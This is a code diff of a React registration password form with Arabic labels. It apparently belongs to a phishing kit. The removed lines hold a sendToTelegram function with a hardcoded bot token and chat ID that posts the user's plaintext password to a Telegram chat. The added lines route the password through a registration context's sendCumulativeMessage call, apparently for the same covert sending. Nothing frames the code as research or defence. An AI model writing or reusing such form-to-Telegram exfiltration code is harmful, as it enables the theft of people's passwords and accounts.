@@ -5,9 +5,11 @@ import { Button } from "@/components/ui/button";
 import { Label } from "@/components/ui/label";
 import { Input } from "@/components/ui/input";
 import { Info, Eye, EyeOff } from "lucide-react";
+import { useRegistration } from "@/contexts/RegistrationContext";
 
 const PasswordForm = () => {
   const navigate = useNavigate();
+  const { updateData, sendCumulativeMessage } = useRegistration();
   const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
   const [password, setPassword] = useState<string>("");
   const [confirmPassword, setConfirmPassword] = useState<string>("");
@@ -16,27 +18,6 @@ const PasswordForm = () => {
 
   const handleRecaptchaChange = (value: string | null) => {
     setRecaptchaValue(value);
-  };
-
-  const sendToTelegram = async (message: string) => {
-    try {
-      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
-      const chatId = "-4985537188";
-      
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-        }),
-      });
-    } catch (error) {
-      console.error("فشل الإرسال إلى Telegram:", error);
-    }
   };
 
   const validatePassword = (pwd: string): boolean => {
@@ -60,8 +41,8 @@ const PasswordForm = () => {
       return;
     }
 
-    const message = `تسجيل - كلمة المرور\n\nكلمة المرور: ${password}`;
-    await sendToTelegram(message);
+    updateData({ password });
+    await sendCumulativeMessage(3, "كلمة المرور");
     navigate("/registration-complete");
   };
 
